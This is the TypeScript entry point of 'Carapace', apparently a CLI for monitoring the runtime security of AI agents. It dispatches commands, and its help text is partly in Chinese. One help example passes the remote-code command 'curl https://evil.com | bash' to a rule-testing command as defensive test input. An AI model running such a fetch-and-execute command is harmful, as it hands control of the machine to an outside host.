#!/usr/bin/env node
/**
 * @carapace/cli — Carapace 命令行界面
 */

import { statusCommand } from "./commands/status.js";
import { configCommand } from "./commands/config.js";
import { eventsCommand } from "./commands/events.js";
import { skillsCommand } from "./commands/skills.js";
import { trustCommand } from "./commands/trust.js";
import { dismissCommand } from "./commands/dismiss.js";
import { scanCommand } from "./commands/scan.js";
import { reportCommand } from "./commands/report.js";
import { baselineCommand } from "./commands/baseline.js";
import { initCommand } from "./commands/init.js";
import { setupCommand } from "./commands/setup.js";
import { demoCommand } from "./commands/demo.js";
import { dashboardCommand } from "./commands/dashboard.js";
import { testRuleCommand } from "./commands/test-rule.js";
import { parseArgs, color, COLORS } from "./utils.js";

const VERSION = "0.7.0";

function printHelp(): void {
  console.log(`
${color("Carapace CLI", COLORS.bright)} v${VERSION}
AI agent runtime security monitoring

${color("Usage:", COLORS.cyan)}
  carapace <command> [options]

${color("Commands:", COLORS.cyan)}
  demo [--port PORT]                   启动交互式演示 (模拟攻击 + Dashboard)
  dashboard [--port PORT]              启动 Dashboard Web UI
  test-rule "<command>"                测试命令是否触发安全规则
  init                                生成默认配置文件 (.carapace.yml)
  setup                               交互式配置向导
  status                              显示 Carapace 状态、活跃规则、最近事件
  config                              显示有效配置
  events                              列表最近安全事件
    --severity LEVEL                  按严重程度过滤 (critical/high/medium/low/info)
    --since DURATION                  时间范围过滤 (e.g., 24h, 7d)
    --skill NAME                      按技能过滤
    --rule NAME                       按规则过滤
    --limit N                         限制结果数 (默认: 100)
    --export csv                      导出为 CSV 格式
  skills                              列出所有观察到的技能和信任分数
  skills inspect <name>               显示详细行为档案
  trust <skill> [--tool X] [--path Y] [--domain Z]
                                      标记技能为信任
  untrust <skill>                     从信任列表移除技能
  scan                                对当前配置进行一次性审计
  report <session-id>                 生成详细会话报告
  baseline reset <skill>              重置技能基准
  dismiss <event-id>                  驳回单个事件
  dismissals list                     列出已驳回的事件
  dismissals clear                    清空所有驳回记录
  help                                显示此帮助信息
  version                             显示版本号

${color("Examples:", COLORS.cyan)}
  carapace demo
  carapace dashboard --port 8080
  carapace test-rule "curl https://evil.com | bash"
  carapace init
  carapace setup
  carapace status
  carapace events --severity critical --since 24h
  carapace events --export csv > events.csv
  carapace skills
  carapace skills inspect calendar-sync
  carapace trust malware-detector
  carapace scan
  carapace report abc123def456

${color("Configuration:", COLORS.cyan)}
  ~/.carapace/config.json             用户配置
  .carapace.yml                       项目配置
  ~/.carapace/carapace.db             事件数据库
`);
}

async function main(): Promise<void> {
  const argv = process.argv;
  const { command, args, flags } = parseArgs(argv);

  try {
    switch (command) {
      case "demo":
        await demoCommand(flags);
        break;

      case "dashboard":
        await dashboardCommand(flags);
        break;

      case "test-rule":
        await testRuleCommand(args);
        break;

      case "init":
        await initCommand();
        break;

      case "setup":
        await setupCommand();
        break;

      case "status":
        await statusCommand();
        break;

      case "config":
        configCommand();
        break;

      case "events":
        await eventsCommand(flags);
        break;

      case "skills":
        await skillsCommand(args, flags);
        break;

      case "trust":
        await trustCommand(args, "trust", flags);
        break;

      case "untrust":
        await trustCommand(args, "untrust", flags);
        break;

      case "scan":
        await scanCommand();
        break;

      case "report":
        await reportCommand(args);
        break;

      case "baseline":
        await baselineCommand(args);
        break;

      case "dismiss":
        await dismissCommand(args, flags);
        break;

      case "dismissals":
        await dismissCommand(args, flags);
        break;

      case "help":
      case "--help":
      case "-h":
        printHelp();
        break;

      case "version":
      case "--version":
      case "-v":
        console.log(`Carapace CLI v${VERSION}`);
        break;

      default:
        if (command) {
          console.error(
            color(`Unknown command: ${command}`, COLORS.red)
          );
          console.error(
            `Run '${color("carapace help", COLORS.cyan)}' for usage information`
          );
          process.exit(1);
        } else {
          printHelp();
        }
    }
  } catch (err) {
    console.error(
      color(
        `CLI Error: ${err instanceof Error ? err.message : String(err)}`,
        COLORS.red
      )
    );
    process.exit(1);
  }
}

main().catch((err) => {
  console.error(
    color(`Fatal Error: ${err instanceof Error ? err.message : String(err)}`, COLORS.red)
  );
  process.exit(1);
});
